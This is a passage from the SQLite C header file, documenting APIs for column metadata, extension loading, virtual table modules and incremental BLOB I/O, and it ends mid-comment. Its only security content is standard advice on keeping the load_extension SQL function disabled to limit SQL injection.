** interface.  This routine is provided for historical compatibility
** only.  All new applications should use the
** [sqlite3_soft_heap_limit64()] interface rather than this one.
*/
SQLITE_API SQLITE_DEPRECATED void sqlite3_soft_heap_limit(int N);


/*
** CAPI3REF: Extract Metadata About A Column Of A Table
** METHOD: sqlite3
**
** ^(The sqlite3_table_column_metadata(X,D,T,C,....) routine returns
** information about column C of table T in database D
** on [database connection] X.)^  ^The sqlite3_table_column_metadata()
** interface returns SQLITE_OK and fills in the non-NULL pointers in
** the final five arguments with appropriate values if the specified
** column exists.  ^The sqlite3_table_column_metadata() interface returns
** SQLITE_ERROR and if the specified column does not exist.
** ^If the column-name parameter to sqlite3_table_column_metadata() is a
** NULL pointer, then this routine simply checks for the existence of the
** table and returns SQLITE_OK if the table exists and SQLITE_ERROR if it
** does not.  If the table name parameter T in a call to
** sqlite3_table_column_metadata(X,D,T,C,...) is NULL then the result is
** undefined behavior.
**
** ^The column is identified by the second, third and fourth parameters to
** this function. ^(The second parameter is either the name of the database
** (i.e. "main", "temp", or an attached database) containing the specified
** table or NULL.)^ ^If it is NULL, then all attached databases are searched
** for the table using the same algorithm used by the database engine to
** resolve unqualified table references.
**
** ^The third and fourth parameters to this function are the table and column
** name of the desired column, respectively.
**
** ^Metadata is returned by writing to the memory locations passed as the 5th
** and subsequent parameters to this function. ^Any of these arguments may be
** NULL, in which case the corresponding element of metadata is omitted.
**
** ^(<blockquote>
** <table border="1">
** <tr><th> Parameter <th> Output<br>Type <th>  Description
**
** <tr><td> 5th <td> const char* <td> Data type
** <tr><td> 6th <td> const char* <td> Name of default collation sequence
** <tr><td> 7th <td> int         <td> True if column has a NOT NULL constraint
** <tr><td> 8th <td> int         <td> True if column is part of the PRIMARY KEY
** <tr><td> 9th <td> int         <td> True if column is [AUTOINCREMENT]
** </table>
** </blockquote>)^
**
** ^The memory pointed to by the character pointers returned for the
** declaration type and collation sequence is valid until the next
** call to any SQLite API function.
**
** ^If the specified table is actually a view, an [error code] is returned.
**
** ^If the specified column is "rowid", "oid" or "_rowid_" and the table 
** is not a [WITHOUT ROWID] table and an
** [INTEGER PRIMARY KEY] column has been explicitly declared, then the output
** parameters are set for the explicitly declared column. ^(If there is no
** [INTEGER PRIMARY KEY] column, then the outputs
** for the [rowid] are set as follows:
**
** <pre>
**     data type: "INTEGER"
**     collation sequence: "BINARY"
**     not null: 0
**     primary key: 1
**     auto increment: 0
** </pre>)^
**
** ^This function causes all database schemas to be read from disk and
** parsed, if that has not already been done, and returns an error if
** any errors are encountered while loading the schema.
*/
SQLITE_API int sqlite3_table_column_metadata(
  sqlite3 *db,                /* Connection handle */
  const char *zDbName,        /* Database name or NULL */
  const char *zTableName,     /* Table name */
  const char *zColumnName,    /* Column name */
  char const **pzDataType,    /* OUTPUT: Declared data type */
  char const **pzCollSeq,     /* OUTPUT: Collation sequence name */
  int *pNotNull,              /* OUTPUT: True if NOT NULL constraint exists */
  int *pPrimaryKey,           /* OUTPUT: True if column part of PK */
  int *pAutoinc               /* OUTPUT: True if column is auto-increment */
);

/*
** CAPI3REF: Load An Extension
** METHOD: sqlite3
**
** ^This interface loads an SQLite extension library from the named file.
**
** ^The sqlite3_load_extension() interface attempts to load an
** [SQLite extension] library contained in the file zFile.  If
** the file cannot be loaded directly, attempts are made to load
** with various operating-system specific extensions added.
** So for example, if "samplelib" cannot be loaded, then names like
** "samplelib.so" or "samplelib.dylib" or "samplelib.dll" might
** be tried also.
**
** ^The entry point is zProc.
** ^(zProc may be 0, in which case SQLite will try to come up with an
** entry point name on its own.  It first tries "sqlite3_extension_init".
** If that does not work, it constructs a name "sqlite3_X_init" where the
** X is consists of the lower-case equivalent of all ASCII alphabetic
** characters in the filename from the last "/" to the first following
** "." and omitting any initial "lib".)^
** ^The sqlite3_load_extension() interface returns
** [SQLITE_OK] on success and [SQLITE_ERROR] if something goes wrong.
** ^If an error occurs and pzErrMsg is not 0, then the
** [sqlite3_load_extension()] interface shall attempt to
** fill *pzErrMsg with error message text stored in memory
** obtained from [sqlite3_malloc()]. The calling function
** should free this memory by calling [sqlite3_free()].
**
** ^Extension loading must be enabled using
** [sqlite3_enable_load_extension()] or
** [sqlite3_db_config](db,[SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION],1,NULL)
** prior to calling this API,
** otherwise an error will be returned.
**
** <b>Security warning:</b> It is recommended that the 
** [SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION] method be used to enable only this
** interface.  The use of the [sqlite3_enable_load_extension()] interface
** should be avoided.  This will keep the SQL function [load_extension()]
** disabled and prevent SQL injections from giving attackers
** access to extension loading capabilities.
**
** See also the [load_extension() SQL function].
*/
SQLITE_API int sqlite3_load_extension(
  sqlite3 *db,          /* Load the extension into this database connection */
  const char *zFile,    /* Name of the shared library containing extension */
  const char *zProc,    /* Entry point.  Derived from zFile if 0 */
  char **pzErrMsg       /* Put error message here if not 0 */
);

/*
** CAPI3REF: Enable Or Disable Extension Loading
** METHOD: sqlite3
**
** ^So as not to open security holes in older applications that are
** unprepared to deal with [extension loading], and as a means of disabling
** [extension loading] while evaluating user-entered SQL, the following API
** is provided to turn the [sqlite3_load_extension()] mechanism on and off.
**
** ^Extension loading is off by default.
** ^Call the sqlite3_enable_load_extension() routine with onoff==1
** to turn extension loading on and call it with onoff==0 to turn
** it back off again.
**
** ^This interface enables or disables both the C-API
** [sqlite3_load_extension()] and the SQL function [load_extension()].
** ^(Use [sqlite3_db_config](db,[SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION],..)
** to enable or disable only the C-API.)^
**
** <b>Security warning:</b> It is recommended that extension loading
** be disabled using the [SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION] method
** rather than this interface, so the [load_extension()] SQL function
** remains disabled. This will prevent SQL injections from giving attackers
** access to extension loading capabilities.
*/
SQLITE_API int sqlite3_enable_load_extension(sqlite3 *db, int onoff);

/*
** CAPI3REF: Automatically Load Statically Linked Extensions
**
** ^This interface causes the xEntryPoint() function to be invoked for
** each new [database connection] that is created.  The idea here is that
** xEntryPoint() is the entry point for a statically linked [SQLite extension]
** that is to be automatically loaded into all new database connections.
**
** ^(Even though the function prototype shows that xEntryPoint() takes
** no arguments and returns void, SQLite invokes xEntryPoint() with three
** arguments and expects an integer result as if the signature of the
** entry point where as follows:
**
** <blockquote><pre>
** &nbsp;  int xEntryPoint(
** &nbsp;    sqlite3 *db,
** &nbsp;    const char **pzErrMsg,
** &nbsp;    const struct sqlite3_api_routines *pThunk
** &nbsp;  );
** </pre></blockquote>)^
**
** If the xEntryPoint routine encounters an error, it should make *pzErrMsg
** point to an appropriate error message (obtained from [sqlite3_mprintf()])
** and return an appropriate [error code].  ^SQLite ensures that *pzErrMsg
** is NULL before calling the xEntryPoint().  ^SQLite will invoke
** [sqlite3_free()] on *pzErrMsg after xEntryPoint() returns.  ^If any
** xEntryPoint() returns an error, the [sqlite3_open()], [sqlite3_open16()],
** or [sqlite3_open_v2()] call that provoked the xEntryPoint() will fail.
**
** ^Calling sqlite3_auto_extension(X) with an entry point X that is already
** on the list of automatic extensions is a harmless no-op. ^No entry point
** will be called more than once for each database connection that is opened.
**
** See also: [sqlite3_reset_auto_extension()]
** and [sqlite3_cancel_auto_extension()]
*/
SQLITE_API int sqlite3_auto_extension(void(*xEntryPoint)(void));

/*
** CAPI3REF: Cancel Automatic Extension Loading
**
** ^The [sqlite3_cancel_auto_extension(X)] interface unregisters the
** initialization routine X that was registered using a prior call to
** [sqlite3_auto_extension(X)].  ^The [sqlite3_cancel_auto_extension(X)]
** routine returns 1 if initialization routine X was successfully 
** unregistered and it returns 0 if X was not on the list of initialization
** routines.
*/
SQLITE_API int sqlite3_cancel_auto_extension(void(*xEntryPoint)(void));

/*
** CAPI3REF: Reset Automatic Extension Loading
**
** ^This interface disables all automatic extensions previously
** registered using [sqlite3_auto_extension()].
*/
SQLITE_API void sqlite3_reset_auto_extension(void);

/*
** The interface to the virtual-table mechanism is currently considered
** to be experimental.  The interface might change in incompatible ways.
** If this is a problem for you, do not use the interface at this time.
**
** When the virtual-table mechanism stabilizes, we will declare the
** interface fixed, support it indefinitely, and remove this comment.
*/

/*
** Structures used by the virtual table interface
*/
typedef struct sqlite3_vtab sqlite3_vtab;
typedef struct sqlite3_index_info sqlite3_index_info;
typedef struct sqlite3_vtab_cursor sqlite3_vtab_cursor;
typedef struct sqlite3_module sqlite3_module;

/*
** CAPI3REF: Virtual Table Object
** KEYWORDS: sqlite3_module {virtual table module}
**
** This structure, sometimes called a "virtual table module", 
** defines the implementation of a [virtual tables].  
** This structure consists mostly of methods for the module.
**
** ^A virtual table module is created by filling in a persistent
** instance of this structure and passing a pointer to that instance
** to [sqlite3_create_module()] or [sqlite3_create_module_v2()].
** ^The registration remains valid until it is replaced by a different
** module or until the [database connection] closes.  The content
** of this structure must not change while it is registered with
** any database connection.
*/
struct sqlite3_module {
  int iVersion;
  int (*xCreate)(sqlite3*, void *pAux,
               int argc, const char *const*argv,
               sqlite3_vtab **ppVTab, char**);
  int (*xConnect)(sqlite3*, void *pAux,
               int argc, const char *const*argv,
               sqlite3_vtab **ppVTab, char**);
  int (*xBestIndex)(sqlite3_vtab *pVTab, sqlite3_index_info*);
  int (*xDisconnect)(sqlite3_vtab *pVTab);
  int (*xDestroy)(sqlite3_vtab *pVTab);
  int (*xOpen)(sqlite3_vtab *pVTab, sqlite3_vtab_cursor **ppCursor);
  int (*xClose)(sqlite3_vtab_cursor*);
  int (*xFilter)(sqlite3_vtab_cursor*, int idxNum, const char *idxStr,
                int argc, sqlite3_value **argv);
  int (*xNext)(sqlite3_vtab_cursor*);
  int (*xEof)(sqlite3_vtab_cursor*);
  int (*xColumn)(sqlite3_vtab_cursor*, sqlite3_context*, int);
  int (*xRowid)(sqlite3_vtab_cursor*, sqlite3_int64 *pRowid);
  int (*xUpdate)(sqlite3_vtab *, int, sqlite3_value **, sqlite3_int64 *);
  int (*xBegin)(sqlite3_vtab *pVTab);
  int (*xSync)(sqlite3_vtab *pVTab);
  int (*xCommit)(sqlite3_vtab *pVTab);
  int (*xRollback)(sqlite3_vtab *pVTab);
  int (*xFindFunction)(sqlite3_vtab *pVtab, int nArg, const char *zName,
                       void (**pxFunc)(sqlite3_context*,int,sqlite3_value**),
                       void **ppArg);
  int (*xRename)(sqlite3_vtab *pVtab, const char *zNew);
  /* The methods above are in version 1 of the sqlite_module object. Those 
  ** below are for version 2 and greater. */
  int (*xSavepoint)(sqlite3_vtab *pVTab, int);
  int (*xRelease)(sqlite3_vtab *pVTab, int);
  int (*xRollbackTo)(sqlite3_vtab *pVTab, int);
  /* The methods above are in versions 1 and 2 of the sqlite_module object.
  ** Those below are for version 3 and greater. */
  int (*xShadowName)(const char*);
};

/*
** CAPI3REF: Virtual Table Indexing Information
** KEYWORDS: sqlite3_index_info
**
** The sqlite3_index_info structure and its substructures is used as part
** of the [virtual table] interface to
** pass information into and receive the reply from the [xBestIndex]
** method of a [virtual table module].  The fields under **Inputs** are the
** inputs to xBestIndex and are read-only.  xBestIndex inserts its
** results into the **Outputs** fields.
**
** ^(The aConstraint[] array records WHERE clause constraints of the form:
**
** <blockquote>column OP expr</blockquote>
**
** where OP is =, &lt;, &lt;=, &gt;, or &gt;=.)^  ^(The particular operator is
** stored in aConstraint[].op using one of the
** [SQLITE_INDEX_CONSTRAINT_EQ | SQLITE_INDEX_CONSTRAINT_ values].)^
** ^(The index of the column is stored in
** aConstraint[].iColumn.)^  ^(aConstraint[].usable is TRUE if the
** expr on the right-hand side can be evaluated (and thus the constraint
** is usable) and false if it cannot.)^
**
** ^The optimizer automatically inverts terms of the form "expr OP column"
** and makes other simplifications to the WHERE clause in an attempt to
** get as many WHERE clause terms into the form shown above as possible.
** ^The aConstraint[] array only reports WHERE clause terms that are
** relevant to the particular virtual table being queried.
**
** ^Information about the ORDER BY clause is stored in aOrderBy[].
** ^Each term of aOrderBy records a column of the ORDER BY clause.
**
** The colUsed field indicates which columns of the virtual table may be
** required by the current scan. Virtual table columns are numbered from
** zero in the order in which they appear within the CREATE TABLE statement
** passed to sqlite3_declare_vtab(). For the first 63 columns (columns 0-62),
** the corresponding bit is set within the colUsed mask if the column may be
** required by SQLite. If the table has at least 64 columns and any column
** to the right of the first 63 is required, then bit 63 of colUsed is also
** set. In other words, column iCol may be required if the expression
** (colUsed & ((sqlite3_uint64)1 << (iCol>=63 ? 63 : iCol))) evaluates to 
** non-zero.
**
** The [xBestIndex] method must fill aConstraintUsage[] with information
** about what parameters to pass to xFilter.  ^If argvIndex>0 then
** the right-hand side of the corresponding aConstraint[] is evaluated
** and becomes the argvIndex-th entry in argv.  ^(If aConstraintUsage[].omit
** is true, then the constraint is assumed to be fully handled by the
** virtual table and is not checked again by SQLite.)^
**
** ^The idxNum and idxPtr values are recorded and passed into the
** [xFilter] method.
** ^[sqlite3_free()] is used to free idxPtr if and only if
** needToFreeIdxPtr is true.
**
** ^The orderByConsumed means that output from [xFilter]/[xNext] will occur in
** the correct order to satisfy the ORDER BY clause so that no separate
** sorting step is required.
**
** ^The estimatedCost value is an estimate of the cost of a particular
** strategy. A cost of N indicates that the cost of the strategy is similar
** to a linear scan of an SQLite table with N rows. A cost of log(N) 
** indicates that the expense of the operation is similar to that of a
** binary search on a unique indexed field of an SQLite table with N rows.
**
** ^The estimatedRows value is an estimate of the number of rows that
** will be returned by the strategy.
**
** The xBestIndex method may optionally populate the idxFlags field with a 
** mask of SQLITE_INDEX_SCAN_* flags. Currently there is only one such flag -
** SQLITE_INDEX_SCAN_UNIQUE. If the xBestIndex method sets this flag, SQLite
** assumes that the strategy may visit at most one row. 
**
** Additionally, if xBestIndex sets the SQLITE_INDEX_SCAN_UNIQUE flag, then
** SQLite also assumes that if a call to the xUpdate() method is made as
** part of the same statement to delete or update a virtual table row and the
** implementation returns SQLITE_CONSTRAINT, then there is no need to rollback
** any database changes. In other words, if the xUpdate() returns
** SQLITE_CONSTRAINT, the database contents must be exactly as they were
** before xUpdate was called. By contrast, if SQLITE_INDEX_SCAN_UNIQUE is not
** set and xUpdate returns SQLITE_CONSTRAINT, any database changes made by
** the xUpdate method are automatically rolled back by SQLite.
**
** IMPORTANT: The estimatedRows field was added to the sqlite3_index_info
** structure for SQLite [version 3.8.2] ([dateof:3.8.2]). 
** If a virtual table extension is
** used with an SQLite version earlier than 3.8.2, the results of attempting 
** to read or write the estimatedRows field are undefined (but are likely 
** to included crashing the application). The estimatedRows field should
** therefore only be used if [sqlite3_libversion_number()] returns a
** value greater than or equal to 3008002. Similarly, the idxFlags field
** was added for [version 3.9.0] ([dateof:3.9.0]). 
** It may therefore only be used if
** sqlite3_libversion_number() returns a value greater than or equal to
** 3009000.
*/
struct sqlite3_index_info {
  /* Inputs */
  int nConstraint;           /* Number of entries in aConstraint */
  struct sqlite3_index_constraint {
     int iColumn;              /* Column constrained.  -1 for ROWID */
     unsigned char op;         /* Constraint operator */
     unsigned char usable;     /* True if this constraint is usable */
     int iTermOffset;          /* Used internally - xBestIndex should ignore */
  } *aConstraint;            /* Table of WHERE clause constraints */
  int nOrderBy;              /* Number of terms in the ORDER BY clause */
  struct sqlite3_index_orderby {
     int iColumn;              /* Column number */
     unsigned char desc;       /* True for DESC.  False for ASC. */
  } *aOrderBy;               /* The ORDER BY clause */
  /* Outputs */
  struct sqlite3_index_constraint_usage {
    int argvIndex;           /* if >0, constraint is part of argv to xFilter */
    unsigned char omit;      /* Do not code a test for this constraint */
  } *aConstraintUsage;
  int idxNum;                /* Number used to identify the index */
  char *idxStr;              /* String, possibly obtained from sqlite3_malloc */
  int needToFreeIdxStr;      /* Free idxStr using sqlite3_free() if true */
  int orderByConsumed;       /* True if output is already ordered */
  double estimatedCost;           /* Estimated cost of using this index */
  /* Fields below are only available in SQLite 3.8.2 and later */
  sqlite3_int64 estimatedRows;    /* Estimated number of rows returned */
  /* Fields below are only available in SQLite 3.9.0 and later */
  int idxFlags;              /* Mask of SQLITE_INDEX_SCAN_* flags */
  /* Fields below are only available in SQLite 3.10.0 and later */
  sqlite3_uint64 colUsed;    /* Input: Mask of columns used by statement */
};

/*
** CAPI3REF: Virtual Table Scan Flags
**
** Virtual table implementations are allowed to set the 
** [sqlite3_index_info].idxFlags field to some combination of
** these bits.
*/
#define SQLITE_INDEX_SCAN_UNIQUE      1     /* Scan visits at most 1 row */

/*
** CAPI3REF: Virtual Table Constraint Operator Codes
**
** These macros defined the allowed values for the
** [sqlite3_index_info].aConstraint[].op field.  Each value represents
** an operator that is part of a constraint term in the wHERE clause of
** a query that uses a [virtual table].
*/
#define SQLITE_INDEX_CONSTRAINT_EQ         2
#define SQLITE_INDEX_CONSTRAINT_GT         4
#define SQLITE_INDEX_CONSTRAINT_LE         8
#define SQLITE_INDEX_CONSTRAINT_LT        16
#define SQLITE_INDEX_CONSTRAINT_GE        32
#define SQLITE_INDEX_CONSTRAINT_MATCH     64
#define SQLITE_INDEX_CONSTRAINT_LIKE      65
#define SQLITE_INDEX_CONSTRAINT_GLOB      66
#define SQLITE_INDEX_CONSTRAINT_REGEXP    67
#define SQLITE_INDEX_CONSTRAINT_NE        68
#define SQLITE_INDEX_CONSTRAINT_ISNOT     69
#define SQLITE_INDEX_CONSTRAINT_ISNOTNULL 70
#define SQLITE_INDEX_CONSTRAINT_ISNULL    71
#define SQLITE_INDEX_CONSTRAINT_IS        72
#define SQLITE_INDEX_CONSTRAINT_FUNCTION 150

/*
** CAPI3REF: Register A Virtual Table Implementation
** METHOD: sqlite3
**
** ^These routines are used to register a new [virtual table module] name.
** ^Module names must be registered before
** creating a new [virtual table] using the module and before using a
** preexisting [virtual table] for the module.
**
** ^The module name is registered on the [database connection] specified
** by the first parameter.  ^The name of the module is given by the 
** second parameter.  ^The third parameter is a pointer to
** the implementation of the [virtual table module].   ^The fourth
** parameter is an arbitrary client data pointer that is passed through
** into the [xCreate] and [xConnect] methods of the virtual table module
** when a new virtual table is be being created or reinitialized.
**
** ^The sqlite3_create_module_v2() interface has a fifth parameter which
** is a pointer to a destructor for the pClientData.  ^SQLite will
** invoke the destructor function (if it is not NULL) when SQLite
** no longer needs the pClientData pointer.  ^The destructor will also
** be invoked if the call to sqlite3_create_module_v2() fails.
** ^The sqlite3_create_module()
** interface is equivalent to sqlite3_create_module_v2() with a NULL
** destructor.
**
** ^If the third parameter (the pointer to the sqlite3_module object) is
** NULL then no new module is create and any existing modules with the
** same name are dropped.
**
** See also: [sqlite3_drop_modules()]
*/
SQLITE_API int sqlite3_create_module(
  sqlite3 *db,               /* SQLite connection to register module with */
  const char *zName,         /* Name of the module */
  const sqlite3_module *p,   /* Methods for the module */
  void *pClientData          /* Client data for xCreate/xConnect */
);
SQLITE_API int sqlite3_create_module_v2(
  sqlite3 *db,               /* SQLite connection to register module with */
  const char *zName,         /* Name of the module */
  const sqlite3_module *p,   /* Methods for the module */
  void *pClientData,         /* Client data for xCreate/xConnect */
  void(*xDestroy)(void*)     /* Module destructor function */
);

/*
** CAPI3REF: Remove Unnecessary Virtual Table Implementations
** METHOD: sqlite3
**
** ^The sqlite3_drop_modules(D,L) interface removes all virtual
** table modules from database connection D except those named on list L.
** The L parameter must be either NULL or a pointer to an array of pointers
** to strings where the array is terminated by a single NULL pointer.
** ^If the L parameter is NULL, then all virtual table modules are removed.
**
** See also: [sqlite3_create_module()]
*/
SQLITE_API int sqlite3_drop_modules(
  sqlite3 *db,                /* Remove modules from this connection */
  const char **azKeep         /* Except, do not remove the ones named here */
);

/*
** CAPI3REF: Virtual Table Instance Object
** KEYWORDS: sqlite3_vtab
**
** Every [virtual table module] implementation uses a subclass
** of this object to describe a particular instance
** of the [virtual table].  Each subclass will
** be tailored to the specific needs of the module implementation.
** The purpose of this superclass is to define certain fields that are
** common to all module implementations.
**
** ^Virtual tables methods can set an error message by assigning a
** string obtained from [sqlite3_mprintf()] to zErrMsg.  The method should
** take care that any prior string is freed by a call to [sqlite3_free()]
** prior to assigning a new string to zErrMsg.  ^After the error message
** is delivered up to the client application, the string will be automatically
** freed by sqlite3_free() and the zErrMsg field will be zeroed.
*/
struct sqlite3_vtab {
  const sqlite3_module *pModule;  /* The module for this virtual table */
  int nRef;                       /* Number of open cursors */
  char *zErrMsg;                  /* Error message from sqlite3_mprintf() */
  /* Virtual table implementations will typically add additional fields */
};

/*
** CAPI3REF: Virtual Table Cursor Object
** KEYWORDS: sqlite3_vtab_cursor {virtual table cursor}
**
** Every [virtual table module] implementation uses a subclass of the
** following structure to describe cursors that point into the
** [virtual table] and are used
** to loop through the virtual table.  Cursors are created using the
** [sqlite3_module.xOpen | xOpen] method of the module and are destroyed
** by the [sqlite3_module.xClose | xClose] method.  Cursors are used
** by the [xFilter], [xNext], [xEof], [xColumn], and [xRowid] methods
** of the module.  Each module implementation will define
** the content of a cursor structure to suit its own needs.
**
** This superclass exists in order to define fields of the cursor that
** are common to all implementations.
*/
struct sqlite3_vtab_cursor {
  sqlite3_vtab *pVtab;      /* Virtual table of this cursor */
  /* Virtual table implementations will typically add additional fields */
};

/*
** CAPI3REF: Declare The Schema Of A Virtual Table
**
** ^The [xCreate] and [xConnect] methods of a
** [virtual table module] call this interface
** to declare the format (the names and datatypes of the columns) of
** the virtual tables they implement.
*/
SQLITE_API int sqlite3_declare_vtab(sqlite3*, const char *zSQL);

/*
** CAPI3REF: Overload A Function For A Virtual Table
** METHOD: sqlite3
**
** ^(Virtual tables can provide alternative implementations of functions
** using the [xFindFunction] method of the [virtual table module].  
** But global versions of those functions
** must exist in order to be overloaded.)^
**
** ^(This API makes sure a global version of a function with a particular
** name and number of parameters exists.  If no such function exists
** before this API is called, a new function is created.)^  ^The implementation
** of the new function always causes an exception to be thrown.  So
** the new function is not good for anything by itself.  Its only
** purpose is to be a placeholder function that can be overloaded
** by a [virtual table].
*/
SQLITE_API int sqlite3_overload_function(sqlite3*, const char *zFuncName, int nArg);

/*
** The interface to the virtual-table mechanism defined above (back up
** to a comment remarkably similar to this one) is currently considered
** to be experimental.  The interface might change in incompatible ways.
** If this is a problem for you, do not use the interface at this time.
**
** When the virtual-table mechanism stabilizes, we will declare the
** interface fixed, support it indefinitely, and remove this comment.
*/

/*
** CAPI3REF: A Handle To An Open BLOB
** KEYWORDS: {BLOB handle} {BLOB handles}
**
** An instance of this object represents an open BLOB on which
** [sqlite3_blob_open | incremental BLOB I/O] can be performed.
** ^Objects of this type are created by [sqlite3_blob_open()]
** and destroyed by [sqlite3_blob_close()].
** ^The [sqlite3_blob_read()] and [sqlite3_blob_write()] interfaces
** can be used to read or write small subsections of the BLOB.
** ^The [sqlite3_blob_bytes()] interface returns the size of the BLOB in bytes.
*/
typedef struct sqlite3_blob sqlite3_blob;

/*
** CAPI3REF: Open A BLOB For Incremental I/O
** METHOD: sqlite3
** CONSTRUCTOR: sqlite3_blob
**
** ^(This interfaces opens a [BLOB handle | handle] to the BLOB located
** in row iRow, column zColumn, table zTable in database zDb;
** in other words, the same BLOB that would be selected by:
**
** <pre>
**     SELECT zColumn FROM zDb.zTable WHERE [rowid] = iRow;
** </pre>)^
**
** ^(Parameter zDb is not the filename that contains the database, but 
** rather the symbolic name of the database. For attached databases, this is
** the name that appears after the AS keyword in the [ATTACH] statement.
** For the main database file, the database name is "main". For TEMP
** tables, the database name is "temp".)^
**
** ^If the flags parameter is non-zero, then the BLOB is opened for read
** and write access. ^If the flags parameter is zero, the BLOB is opened for
** read-only access.
**
** ^(On success, [SQLITE_OK] is returned and the new [BLOB handle] is stored
** in *ppBlob. Otherwise an [error code] is returned and, unless the error
** code is SQLITE_MISUSE, *ppBlob is set to NULL.)^ ^This means that, provided
** the API is not misused, it is always safe to call [sqlite3_blob_close()] 
** on *ppBlob after this function it returns.
**
** This function fails with SQLITE_ERROR if any of the following are true:
** <ul>
**   <li> ^(Database zDb does not exist)^, 
**   <li> ^(Table zTable does not exist within database zDb)^, 
**   <li> ^(Table zTable is a WITHOUT ROWID table)^, 
**   <li> ^(Column zColumn does not exist)^,
**   <li> ^(Row iRow is not present in the table)^,
**   <li> ^(The specified column of row iRow contains a value that is not
**         a TEXT or BLOB value)^,
**   <li> ^(Column zColumn is part of an index, PRIMARY KEY or UNIQUE 
**         constraint and the blob is being opened for read/write access)^,
**   <li> ^([foreign key constraints | Foreign key constraints] are enabled, 
**         column zColumn is part of a [child key] definition and the blob is
**         being opened for read/write access)^.
** </ul>
**
** ^Unless it returns SQLITE_MISUSE, this function sets the 
** [database connection] error code and message accessible via 
** [sqlite3_errcode()] and [sqlite3_errmsg()] and related functions. 
**
** A BLOB referenced by sqlite3_blob_open() may be read using the
** [sqlite3_blob_read()] interface and modified by using
** [sqlite3_blob_write()].  The [BLOB handle] can be moved to a
** different row of the same table using the [sqlite3_blob_reopen()]
** interface.  However, the column, table, or database of a [BLOB handle]
** cannot be changed after the [BLOB handle] is opened.
**
** ^(If the row that a BLOB handle points to is modified by an
** [UPDATE], [DELETE], or by [ON CONFLICT] side-effects
** then the BLOB handle is marked as "expired".
** This is true if any column of the row is changed, even a column
** other than the one the BLOB handle is open on.)^
** ^Calls to [sqlite3_blob_read()] and [sqlite3_blob_write()] for
** an expired BLOB handle fail with a return code of [SQLITE_ABORT].
** ^(Changes written into a BLOB prior to the BLOB expiring are not
** rolled back by the expiration of the BLOB.  Such changes will eventually
** commit if the transaction continues to completion.)^
**
** ^Use the [sqlite3_blob_bytes()] interface to determine the size of
** the opened blob.  ^The size of a blob may not be changed by this
** interface.  Use the [UPDATE] SQL command to change the size of a
** blob.
**
** ^The [sqlite3_bind_zeroblob()] and [sqlite3_result_zeroblob()] interfaces
** and the built-in [zeroblob] SQL function may be used to create a 
** zero-filled blob to read or write using the incremental-blob interface.
**
** To avoid a resource leak, every open [BLOB handle] should eventually
** be released by a call to [sqlite3_blob_close()].
**
** See also: [sqlite3_blob_close()],
** [sqlite3_blob_reopen()], [sqlite3_blob_read()],
** [sqlite3_blob_bytes()], [sqlite3_blob_write()].
*/
SQLITE_API int sqlite3_blob_open(
  sqlite3*,
  const char *zDb,
  const char *zTable,
  const char *zColumn,
  sqlite3_int64 iRow,
  int flags,
  sqlite3_blob **ppBlob
);

/*
** CAPI3REF: Move a BLOB Handle to a New Row
** METHOD: sqlite3_blob
**
** ^This function is used to move an existing [BLOB handle] so that it points
** to a different row of the same database table. ^The new row is identified
** by the rowid value passed as the second argument. Only the row can be
** changed. ^The database, table and column on which the blob handle is open
** remain the same. Moving an existing [BLOB handle] to a new row is
** faster than closing the existing handle and opening a new one.
**
** ^(The new row must meet the same criteria as for [sqlite3_blob_open()] -
** it must exist and there must be either a blob or text value stored in
** the nominated column.)^ ^If the new row is not present in the table, or if
** it does not contain a blob or text value, or if another error occurs, an
** SQLite error code is returned and the blob handle is considered aborted.
** ^All subsequent calls to [sqlite3_blob_read()], [sqlite3_blob_write()] or
** [sqlite3_blob_reopen()] on an aborted blob handle immediately return
** SQLITE_ABORT. ^Calling [sqlite3_blob_bytes()] on an aborted blob handle
** always returns zero.
**
** ^This function sets the database handle error code and message.
*/
SQLITE_API int sqlite3_blob_reopen(sqlite3_blob *, sqlite3_int64);

/*
** CAPI3REF: Close A BLOB Handle
** DESTRUCTOR: sqlite3_blob
**
** ^This function closes an open [BLOB handle]. ^(The BLOB handle is closed
** unconditionally.  Even if this routine returns an error code, the 
** handle is still closed.)^
**
** ^If the blob handle being closed was opened for read-write access, and if
** the database is in auto-commit mode and there are no other open read-write
** blob handles or active write statements, the current transaction is
** committed. ^If an error occurs while committing the transaction, an error
** code is returned and the transaction rolled back.
**
** Calling this function with an argument that is not a NULL pointer or an
** open blob handle results in undefined behaviour. ^Calling this routine 
** with a null pointer (such as would be returned by a failed call to 
** [sqlite3_blob_open()]) is a harmless no-op. ^Otherwise, if this function
** is passed a valid open blob handle, the values returned by the 
** sqlite3_errcode() and sqlite3_errmsg() functions are set before returning.
*/
SQLITE_API int sqlite3_blob_close(sqlite3_blob *);

/*
** CAPI3REF: Return The Size Of An Open BLOB
** METHOD: sqlite3_blob
**
** ^Returns the size in bytes of the BLOB accessible via the 
** successfully opened [BLOB handle] in its only argument.  ^The
** incremental blob I/O routines can only read or overwriting existing
** blob content; they cannot change the size of a blob.
**
** This routine only works on a [BLOB handle] which has been created
** by a prior successful call to [sqlite3_blob_open()] and which has not
** been closed by [sqlite3_blob_close()].  Passing any other pointer in
** to this routine results in undefined and probably undesirable behavior.
*/
SQLITE_API int sqlite3_blob_bytes(sqlite3_blob *);

/*
** CAPI3REF: Read Data From A BLOB Incrementally
** METHOD: sqlite3_blob
**
** ^(This function is used to read data from an open [BLOB handle] into a
** caller-supplied buffer. N bytes of data are copied into buffer Z
** from the open BLOB, starting at offset iOffset.)^
**
** ^If offset iOffset is less than N bytes from the end of the BLOB,
** [SQLITE_ERROR] is returned and no data is read.  ^If N or iOffset is
** less than zero, [SQLITE_ERROR] is returned and no data is read.
** ^The size of the blob (and hence the maximum value of N+iOffset)
** can be determined using the [sqlite3_blob_bytes()] interface.
**
** ^An attempt to read from an expired [BLOB handle] fails with an
** error code of [SQLITE_ABORT].
**
** ^(On success, sqlite3_blob_read() returns SQLITE_OK.
** Otherwise, an [error code] or an [extended error code] is returned.)^
**
** This routine only works on a [BLOB handle] which has been created
** by a prior successful call to [sqlite3_blob_open()] and which has not
** been closed by [sqlite3_blob_close()].  Passing any other pointer in
** to this routine results in undefined and probably undesirable behavior.
**
** See also: [sqlite3_blob_write()].
*/
SQLITE_API int sqlite3_blob_read(sqlite3_blob *, void *Z, int N, int iOffset);

/*
** CAPI3REF: Write Data Into A BLOB Incrementally
** METHOD: sqlite3_blob
**
** ^(This function is used to write data into an open [BLOB handle] from a
